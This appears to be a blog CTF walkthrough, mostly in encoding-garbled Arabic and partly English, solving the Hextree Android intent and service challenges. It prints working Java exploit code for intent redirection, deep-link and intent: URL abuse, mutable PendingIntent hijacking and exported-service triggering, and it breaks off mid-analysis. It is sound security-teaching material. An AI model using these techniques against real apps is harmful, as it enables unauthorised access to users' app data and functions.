instance ÿßŸÑÿÆÿßÿµ ÿ®ŸÄ activity 11 \u0026amp; 5 ŸÅŸä ÿßŸÑŸÄ background Ÿà ÿßŸÇÿØÿ± ÿ£ÿ®ÿπÿ™ ÿßŸÑŸÄ result ÿ®ÿ™ÿßÿπŸä\nIntent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag11Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); intent3.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); startActivity(intent); finish(); Intent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); // ÿπÿ¥ÿßŸÜ ŸÜÿ±ÿ¨ÿπ result recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish(); Flag 12 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; Ÿàÿ£ŸäŸàÿ© ŸÜŸÇÿØÿ± ŸÜÿ®ÿπÿ™Ÿá ŸÖÿ®ÿßÿ¥ÿ±ÿ© ŸÑŸÄ activity\npublic void onCreate(Bundle bundle) { if (getIntent().getAction() == null) { Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); startActivityForResult(intent, 42); } } } public void onActivityResult(int i, int i2, Intent intent) { super.onActivityResult(i, i2, intent); if (intent == null || getIntent() == null || !getIntent().getBooleanExtra(\u0026#34;LOGIN\u0026#34;, false)) { return; } this.f.addTag(\u0026#34;LOGIN\u0026#34;); if (intent.getIntExtra(\u0026#34;token\u0026#34;, -1) == 1094795585) { this.f.addTag(1094795585); success(this); } ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ ŸÜÿ®ÿπÿ™ intent ŸÅÿßÿ∂Ÿä ÿ®ÿπÿØŸäŸÜ ŸáŸäÿ®ÿπÿ™ intent ÿ®ŸÄ action \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot;ÿå ÿ®ÿπÿØŸäŸÜ ŸÜÿ®ÿπÿ™ intent ŸÖÿπ Boolean \u0026quot;LOGIN\u0026quot; true Ÿà extra \u0026quot;token\u0026quot; 1094795585\nÿßŸÑÿ≠ŸÑ # Intent wakeUp= new Intent(); wakeUp.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34;); startActivity(wakeUp); Intent intent2 = new Intent(); intent2.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34;); intent2.putExtra(\u0026#34;LOGIN\u0026#34;, true); startActivity(intent2); Intent receivedIntent = getIntent(); receivedIntent.putExtra(\u0026#34;token\u0026#34;, 1094795585); // ÿßŸÑÿ™ÿ¥ŸäŸÉ ÿπŸÑŸâ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≥ÿ≠ÿ±Ÿä setResult(RESULT_OK, receivedIntent); finish(); Flag 13 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag15Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34;/\u0026gt; \u0026lt;data android:host=\u0026#34;open\u0026#34;/\u0026gt; \u0026lt;data android:host=\u0026#34;flag\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ŸáŸÜÿß ÿßŸÑŸÄ activity ÿ®Ÿäÿ≥ŸÖÿπ ŸÑŸÄ intent ŸÖŸÖŸÉŸÜ Ÿäÿ¨Ÿä ŸÖŸÜ browser ÿ®ŸÄ scheme (protocol) :hex Ÿà host (domain) : open ÿ£Ÿà flag\nprivate boolean isDeeplink(Intent intent) { String action; return ( intent == null || (action = intent.getAction()) == null || !action.equals(\u0026#34;android.intent.action.VIEW\u0026#34;) || !intent.getCategories().contains(\u0026#34;android.intent.category.BROWSABLE\u0026#34;)|| intent.getStringExtra(\u0026#34;com.android.browser.application_id\u0026#34;) == null ) ? false : true; } public void onCreate(Bundle bundle) { Intent intent = getIntent(); if (intent == null) { finish(); } if (isDeeplink(intent)) { Uri data = intent.getData(); if (data.getHost().equals(\u0026#34;flag\u0026#34;) \u0026amp;\u0026amp; data.getQueryParameter(\u0026#34;action\u0026#34;).equals(\u0026#34;give-me\u0026#34;)) { success(this); return; } else { if ( !data.getHost().equals(\u0026#34;open\u0026#34;) || data.getQueryParameter(\u0026#34;message\u0026#34;) == null) { return; } return; } } Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); intent2.setData(Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World\u0026#34;)); startActivity(intent2); } ÿßŸÑŸÄ activity ŸáŸäÿ¥ÿ™ÿ∫ŸÑ ŸÑŸÖÿß ŸäÿßÿÆÿØ intent ÿßŸÑŸÑŸä ŸáŸà Deeplink:\nŸÖÿ¥ ŸÅÿßÿ∂Ÿä ŸÅŸäŸá action android.intent.action.VIEW ŸÅŸäŸá category \u0026quot;android.intent.category.BROWSABLE\u0026quot; ŸÅŸäŸá extra string \u0026quot;com.android.browser.application_id\u0026quot; ŸÖÿ¥ ŸÅÿßÿ∂Ÿä data ÿ¨Ÿàÿß ÿßŸÑŸÄ Deeplink:\nHost ŸáŸà flag parameter \u0026quot;action\u0026quot; ÿ®ŸÇŸäŸÖÿ© \u0026quot;give-me\u0026quot; ÿßŸÑÿ≠ŸÑ # ŸáŸÜÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑŸÖŸàŸÇÿπ ÿßŸÑŸÖÿ™ÿßÿ≠ ÿπÿ¥ÿßŸÜ ŸÜÿ≠ŸÑ ÿßŸÑÿ™ÿ≠ÿØŸäÿßÿ™ ÿßŸÑŸÑŸä ÿ®ÿ™ÿ™ÿ∂ŸÖŸÜ ÿ®ÿπÿ™ url requests ŸÑŸÑŸÄ app ÿ®ÿ™ÿßÿπŸÜÿß ŸàŸáŸà ŸáŸäÿ™ÿπÿßŸÖŸÑ ŸÖÿπ ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÄ deeplinks ŸÑŸÜÿß\nhex://flag?action=give-me Flag 14 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag14Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34; android:host=\u0026#34;token\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ÿßŸÑŸÄ actions ŸàÿßŸÑŸÄ scheme ÿ≤Ÿä flag13 ÿ®ÿ≥ ÿßŸÑŸÄ host ÿØŸÑŸàŸÇÿ™Ÿä ÿ®ÿ≥ token\npublic void onCreate(Bundle bundle) { if (intent.getAction() == null) { Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); String uuid = UUID.randomUUID().toString(); SolvedPreferences.putString(getPrefixKey(\u0026#34;challenge\u0026#34;), uuid); intent2.setData( Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=\u0026#34; + uuid)); startActivity(intent2); return; } if (intent.getAction().equals(\u0026#34;android.intent.action.VIEW\u0026#34;)) { Uri data = intent.getData(); String queryParameter = data.getQueryParameter(\u0026#34;type\u0026#34;); String queryParameter2 = data.getQueryParameter(\u0026#34;authToken\u0026#34;); String queryParameter3 = data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); String string = SolvedPreferences.getString(getPrefixKey(\u0026#34;challenge\u0026#34;)); if (queryParameter == null || queryParameter2 == null || queryParameter3 == null || !queryParameter3.equals(string)) { Toast.makeText(this, \u0026#34;Invalid login\u0026#34;, 1).show(); finish(); return; } this.f.addTag(queryParameter); try { String encodeToString = Base64.getEncoder().encodeToString(MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;).digest(queryParameter2.getBytes())); if (encodeToString.equals(\u0026#34;a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=\u0026#34;)) { if (queryParameter.equals(\u0026#34;user\u0026#34;)) { Toast.makeText(this, \u0026#34;User login successful\u0026#34;, 1).show(); } else if (queryParameter.equals(\u0026#34;admin\u0026#34;)) { Log.i(\u0026#34;Flag14\u0026#34;, \u0026#34;hash: \u0026#34; + encodeToString); this.f.addTag(queryParameter2); Toast.makeText(this, \u0026#34;Admin login successful\u0026#34;, 1).show(); success(this); } } } } ŸÑŸà ŸÖÿßŸÅŸäÿ¥ intent ŸàÿµŸÑ ŸÑŸÑŸÄ activity ŸáŸäÿπŸÖŸÑ activity ÿπÿ¥ÿßŸÜ Ÿäÿ¥ÿ∫ŸÑ login portal ŸàŸäŸàÿØŸäŸÜÿßŸÑŸÑŸÖŸàŸÇÿπ ÿßŸÑŸÑŸä ŸÅŸäŸá ÿ≤ÿ±ÿßÿ± ÿπÿ¥ÿßŸÜ ŸÜŸÉŸÖŸÑ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ ŸàŸÑŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸäŸá ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸäŸÉŸÖŸÑ ÿ®ÿ£ŸÖÿßŸÜ ŸÑÿ£ŸÜ intent ŸáŸäÿ™ÿ®ÿπÿ™ ŸÑŸÑŸÄ activity ÿØŸá ŸàŸáÿ™ÿ≥ÿ¨ŸÑ ÿØÿÆŸàŸÑ ŸÉŸÄ user\u0026hellip;. ÿ®ÿ≥ ÿßÿ≠ŸÜÿß ÿπÿßŸäÿ≤ŸäŸÜ admin\u0026hellip;..\nÿßŸÑÿ≠ŸÑ # ÿπÿ¥ÿßŸÜ ŸÜÿ¨Ÿäÿ® admin ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ ŸÜÿπÿØŸÑ ÿßŸÑŸÄ type parameter ŸÜÿπŸÖŸÑ activity ŸáŸäÿπÿ™ÿ±ÿ∂ ŸàŸäÿ®ÿπÿ™Ÿá ÿ™ÿßŸÜŸä ŸÖÿπ intent ÿ¨ÿØŸäÿØ ÿ®ÿßŸÑŸÄ data ÿßŸÑŸÑŸä ÿπÿßŸäÿ≤ŸäŸÜŸáÿß ÿ®ÿ≥ ŸÜÿ™ÿ£ŸÉÿØ ÿ•ŸÜŸá uri ŸÖÿ¥ ÿ®ÿ≥ ŸÜÿ≠ÿ∑Ÿá ŸÉŸÄ string ŸäÿπŸÜŸä web101\n\u0026lt;activity android:name=\u0026#34;.SecondActivity\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34; android:host=\u0026#34;token\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent intent = getIntent(); Utils.showDialog(this,intent); Uri data = intent.getData(); //String query_parmaeter1 =\u0026#34;type = \u0026#34; + data.getQueryParameter(\u0026#34;type\u0026#34;); //String query_parmaeter2 = \u0026#34;authToken = \u0026#34; + data.getQueryParameter(\u0026#34;authToken\u0026#34;); //String query_parmaeter3 = \u0026#34;authChallenge = \u0026#34; +data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); //Log.d(\u0026#34;data\u0026#34;, data.toString()); //Log.d(\u0026#34;query_parmaeter1\u0026#34;, query_parmaeter1); //Log.d(\u0026#34;query_parmaeter2\u0026#34;, query_parmaeter2); //Log.d(\u0026#34;query_parmaeter3\u0026#34;, query_parmaeter3); String authToken = data.getQueryParameter(\u0026#34;authToken\u0026#34;); String authChallenge = data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); Intent sendIntent = new Intent(); sendIntent.setAction(\u0026#34;android.intent.action.VIEW\u0026#34;); sendIntent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.activities.Flag14Activity\u0026#34;); sendIntent.setData(Uri.parse(\u0026#34;hex://token?authToken=\u0026#34;+authToken+\u0026#34;\u0026amp;type=admin\u0026amp;authChallenge=\u0026#34;+authChallenge)); startActivity(sendIntent); Flag 15 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag15Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ÿßŸÑŸÄ \u0026lt;intent-filter\u0026gt; ŸÖÿßŸÅŸäŸáŸàÿ¥ host ÿ£Ÿà path filterÿü\npublic void onCreate(Bundle bundle) { Intent intent = getIntent(); if (intent == null) { return; } String action = intent.getAction(); if (action == null) { Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); intent2.setData(Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=\u0026#34; + Uri.encode(\u0026#34;intent:#Intent;...\u0026#34;))); startActivity(intent2); return; } if (isDeeplink(intent) \u0026amp;\u0026amp; action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { Bundle extras = intent.getExtras(); if (extras == null) { finish(); } String string = extras.getString(\u0026#34;action\u0026#34;, \u0026#34;open\u0026#34;); if (extras.getBoolean(\u0026#34;flag\u0026#34;, false) \u0026amp;\u0026amp; string.equals(\u0026#34;flag\u0026#34;)) { this.f.addTag(Boolean.valueOf(extras.getBoolean(\u0026#34;flag\u0026#34;, false))); this.f.addTag(string); success(this); } else if (string.equals(\u0026#34;open\u0026#34;)) { Toast.makeText(this, \u0026#34;Website: \u0026#34; + extras.getString(\u0026#34;message\u0026#34;, \u0026#34;open\u0026#34;), 1).show(); } } ÿßŸÑÿ≠ŸÑ # ÿßŸÑŸÄ intent: scheme ŸÅŸä Chrome ÿ®Ÿäÿ≠ŸÑ ÿØŸá ÿ®ÿ•ŸÜŸá Ÿäÿ≥ŸÖÿ≠ ŸÑŸÑŸÖŸàŸÇÿπ ŸäÿπŸÖŸÑ explicit intents ŸÅŸÜŸÇÿØÿ± ŸÜÿπŸÖŸÑ ÿ®ÿ™ÿßÿπŸÜÿß ŸàŸÜÿ®ÿπÿ™Ÿá ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÖŸàŸÇÿπ hex Ÿàÿ™ÿ¥ÿ∫ŸäŸÑŸá ÿπŸÑŸâ ÿßŸÑŸÖŸàÿ®ÿßŸäŸÑ\nintent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;S.open=flag;B.flag=true;end; Flag 22 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra(\u0026#34;PENDING\u0026#34;); if (pendingIntent != null) { try { Intent intent = new Intent(); intent.getExtras(); intent.putExtra(\u0026#34;success\u0026#34;, true); this.f.addTag(intent); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); pendingIntent.send(this, 0, intent); success(null, this); } catch (Exception e) { e.printStackTrace(); } } } ÿßŸÑŸÄ activity ÿ®Ÿäÿ¥ŸäŸÉ ÿπŸÑŸâ Pending intent ÿßÿ≥ŸÖŸá \u0026quot;PENDING\u0026quot; ŸàŸÑŸà ÿßŸÑŸÜÿ™Ÿäÿ¨ÿ© ŸÖŸàÿ¨ŸàÿØÿ© ÿ®Ÿäÿ∂ŸäŸÅ ŸÑŸÑŸÄ intent \u0026quot;success\u0026quot; true Ÿà \u0026quot;flag\u0026quot; ÿ®ÿπÿØŸäŸÜ Ÿäÿ®ÿπÿ™Ÿá ÿ™ÿßŸÜŸä\nÿßŸÑÿ≠ŸÑ # ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ ŸÜÿ®ÿπÿ™ Mutable intent ÿπÿ¥ÿßŸÜ ÿßŸÑŸÄ app ŸäŸÇÿØÿ± Ÿäÿ∂ŸäŸÅ ŸÖÿ≠ÿ™ŸàŸâ ŸÑŸäŸá\nContext context = this; Intent receivedIntent = getIntent(); if (receivedIntent.getParcelableExtra(\u0026#34;PENDING\u0026#34;) != null) { String flag = receivedIntent.getStringExtra(\u0026#34;flag\u0026#34;); Log.d(\u0026#34;Flag22\u0026#34;, flag); }else{ Log.d(\u0026#34;Flag22\u0026#34;, \u0026#34;???\u0026#34;); Intent atackIntent = new Intent(); atackIntent.setClassName(getPackageName(),getPackageName()+ \u0026#34;.pendingIntent\u0026#34;); PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, atackIntent, PendingIntent.FLAG_MUTABLE); Intent senderIntent = new Intent(); senderIntent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag22Activity\u0026#34;); senderIntent.putExtra(\u0026#34;PENDING\u0026#34;, pendingIntent); startActivity(senderIntent); } Flag 23 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onCreate(Bundle bundle) { Intent intent = getIntent(); String action = intent.getAction(); if (action == null) { Intent intent2 = new Intent(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;); intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName()); PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432); Intent intent3 = new Intent(\u0026#34;io.hextree.attacksurface.MUTATE_ME\u0026#34;); intent3.addFlags(8); intent3.putExtra(\u0026#34;pending_intent\u0026#34;, activity); startActivity(intent3); return; } if (action.equals(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;)) { if (intent.getIntExtra(\u0026#34;code\u0026#34;, -1) == 42) { this.f.addTag(42); success(this); } else { Toast.makeText(this, \u0026#34;Condition not met for flag\u0026#34;, 0).show(); } } } ÿßŸÑÿ£ŸàŸÑ ÿ®ŸäÿØŸàÿ± ÿπŸÑŸâ intent ŸàŸÑŸà action ŸÅÿßÿ∂Ÿä ÿ®ŸäÿπŸÖŸÑ pending intent ŸÖÿπ intent2 ŸÉŸÄ base ÿ®ÿ™ÿßÿπŸá ŸÖÿπ action \u0026quot;io.hextree.attacksurface.GIVE_FLAG\u0026quot; Ÿà intent ÿ™ÿßŸÑÿ™ ŸÖÿπ action \u0026quot;io.hextree.attacksurface.MUTATE_ME\u0026quot;ÿå ÿ®ÿπÿØŸäŸÜ ÿ®Ÿäÿ¥ŸäŸÉ ŸÑŸà ÿßŸÑŸÄ response ÿßŸÑŸÖÿ≥ÿ™ŸÇÿ®ŸÑ ŸÅŸäŸá action io.hextree.attacksurface.GIVE_FLAG ŸàŸÑÿß ŸÑÿ£ ŸàŸÑŸà ŸÉÿØŸá Ÿäÿ®ŸÇŸâ ŸÅŸäŸá extra code ÿ®ŸÇŸäŸÖÿ© 42\nÿßŸÑÿ≠ŸÑ # ŸÜÿπŸÖŸÑ class ŸáŸäÿ≥ÿ™ŸÇÿ®ŸÑ intent ÿ®ÿßŸÑŸÄ action ÿßŸÑŸÖÿ≠ÿØÿØ \u0026quot;io.hextree.attacksurface.MUTATE_ME\u0026quot;\n\u0026lt;activity android:name=\u0026#34;.pendingHelper\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.attacksurface.MUTATE_ME\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; ÿ®ÿπÿØŸäŸÜ ŸÑŸÖÿß ŸÜÿ¨Ÿäÿ® ÿßŸÑŸÄ intent ŸÜÿØŸàÿ± ÿπŸÑŸâ pending intent ÿ®ÿßÿ≥ŸÖ pending_intentÿå ÿ®ÿπÿØŸäŸÜ ŸÜÿπŸÖŸÑ intent ŸÖÿπ action \u0026quot;io.hextree.attacksurface.GIVE_FLAG\u0026quot; ŸàŸÜÿ≠ÿ∑ extra code ÿ®ŸÇŸäŸÖÿ© 42 ŸàŸÜÿ≠ÿßŸàŸÑ ŸÜÿ®ÿπÿ™Ÿá (ŸÖŸÖŸÉŸÜ ÿ™ÿ™ÿ¨ÿßŸáŸÑ ÿßŸÑŸÄ condition ÿØŸá ŸÑŸÑŸÄ debugging ÿπÿ¥ÿßŸÜ Ÿäÿ≥ÿßÿπÿØ)\nIntent receivedIntent = getIntent(); if (receivedIntent.getParcelableExtra(\u0026#34;pending_intent\u0026#34;) != null) { PendingIntent pendingIntent = receivedIntent.getParcelableExtra(\u0026#34;pending_intent\u0026#34;); Intent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;); intent.putExtra(\u0026#34;code\u0026#34;, 42); try { pendingIntent.send(this, 0, intent); } catch (PendingIntent.CanceledException e) { throw new RuntimeException(e); } }else{ Log.d(\u0026#34;Nothing\u0026#34;,\u0026#34;ŸÖÿßŸÅŸäÿ¥ pending intent ŸàÿµŸÑ\u0026#34; ); } ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_intent/","section":"Posts","summary":"","title":"HEX Tree intent ÿ™ÿ≠ÿØŸäÿßÿ™","type":"posts"},{"content":" Flag 24 # Code analysis # \u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag24Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; public void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); Intent intent = getIntent(); String stringExtra = intent.getStringExtra(\u0026#34;secret\u0026#34;); this.f.addTag(intent.getAction()); if (Flag24Service.secret.equals(stringExtra)) { success(this); } } The activity waits for an intent that has secret extra string and if it\u0026rsquo;s equal to the same value in Flag24Service we get our flag. But since we cant get in need another way\n\u0026lt;service android:name=\u0026#34;io.hextree.attacksurface.services.Flag24Service\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/service\u0026gt; this an exposed service that listens to action named io.hextree.services.START_FLAG24_SERVICE\n@Override // android.app.Service public int onStartCommand(Intent intent, int i, int i2) { if (intent.getAction().equals(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;)) { success(); } return super.onStartCommand(intent, i, i2); } private void success() { Intent intent = new Intent(this, (Class\u0026lt;?\u0026gt;) Flag24Activity.class); intent.setAction(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;); intent.putExtra(\u0026#34;secret\u0026#34;, secret); intent.addFlags(268468224); intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); startActivity(intent); } In the service when it\u0026rsquo;s started it checks for the action of intent and when it\u0026rsquo;s true a method that will create an intent with extra string secret and will start flag24activity\nSolution # Sending an intent with action \u0026quot;io.hextree.services.START_FLAG24_SERVICE\u0026quot; to the service will do the trick\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag24Service\u0026#34;); send.setAction(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;); startService(send); Flag 25 # Code analysis # boolean lock1 = false; boolean lock2 = false; boolean lock3 = false; public int onStartCommand(Intent intent, int i, int i2) { if (intent != null) { if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK1\u0026#34;)) { this.lock1 = true; } if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK2\u0026#34;)) { if (this.lock1) { this.lock2 = true; } else { resetLocks(); } } if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK3\u0026#34;)) { if (this.lock2) { this.lock3 = true; } else { resetLocks(); } } if (this.lock1 \u0026amp;\u0026amp; this.lock2 \u0026amp;\u0026amp; this.lock3) { success(); resetLocks(); } } } private void success() { Intent intent = new Intent(this, (Class\u0026lt;?\u0026gt;) Flag25Activity.class); intent.putExtra(\u0026#34;secret\u0026#34;, secret); intent.putExtra(\u0026#34;lock\u0026#34;, \u0026#34;lock1\u0026#34;); intent.putExtra(\u0026#34;lock2\u0026#34;, \u0026#34;lock3\u0026#34;); startActivity(intent); } This service has 3 variables for 3 locks and with each lock is opened \u0026ldquo;set to true\u0026rdquo; with each intent sent with valid action for example : lock1 = true when action is io.hextree.services.UNLOCK1 and when all 3 locks are open a method is called that will create an intent with some extra strings then activity25 needs so that we get our flag\nSolution # since services keep the state of variables as long as service is running so we will send 3 intents to the service with that 3 locks actions\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag25Service\u0026#34;); send.setAction(\u0026#34;io.hextree.services.UNLOCK1\u0026#34;); startService(send); send.setAction(\u0026#34;io.hextree.services.UNLOCK2\u0026#34;); startService(send); send.setAction(\u0026#34;io.hextree.services.UNLOCK3\u0026#34;); startService(send); Flag 26 # Code analysis # public static final int MSG_SUCCESS = 42; class IncomingHandler extends Handler { String echo; IncomingHandler(Looper looper) { super(looper); this.echo = \u0026#34;\u0026#34;; } @Override // android.os.Handler public void handleMessage(Message message) { Log.i(\u0026#34;Flag26Service\u0026#34;, \u0026#34;handleMessage(\u0026#34; + message.what + \u0026#34;)\u0026#34;); if (message.what == 42) { Flag26Service.this.success(this.echo); } else { super.handleMessage(message); } } } The service is listening for incoming messages using IncomingHandler and If the message type (message.what) is 42 it will call success method\nSolution # So binds to Flag26Service and sends a message with what = 42 to trigger the success condition. First we establish a server connection that will have our message and send it then we bind to it with bindservice\nprivate ServiceConnection serviceConnection1 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { serviceMessenger = new Messenger(service); Message msg = Message.obtain(null, 42); try{ serviceMessenger.send(msg); } catch (RemoteException e){ throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag26Service\u0026#34;); bindService(send,serviceConnection1, Context.BIND_AUTO_CREATE); Flag 27 # Code analysis # public void handleMessage(Message message) { int i = message.what; if (i == 1) { this.echo = message.getData().getString(\u0026#34;echo\u0026#34;); Toast.makeText(Flag27Service.this.getApplicationContext(), this.echo, 0).show(); return; } if (i != 2) { if (i == 3) { String string = message.getData().getString(\u0026#34;password\u0026#34;); if (!this.echo.equals(\u0026#34;give flag\u0026#34;) || !this.password.equals(string)) { Flag27Service.this.sendReply(message, \u0026#34;no flag\u0026#34;); return; } else { Flag27Service.this.sendReply(message, \u0026#34;success! Launching flag activity\u0026#34;); Flag27Service.this.success(this.echo); return; } } super.handleMessage(message); return; } The service processes messages based on message.what (an integer representing the message type):\ncase = 1: an echo message is extracted and displayed via a toast case = 3: string password \u0026amp; echo are extracted and compared to some values and if true we get our flag if (message.obj == null) { 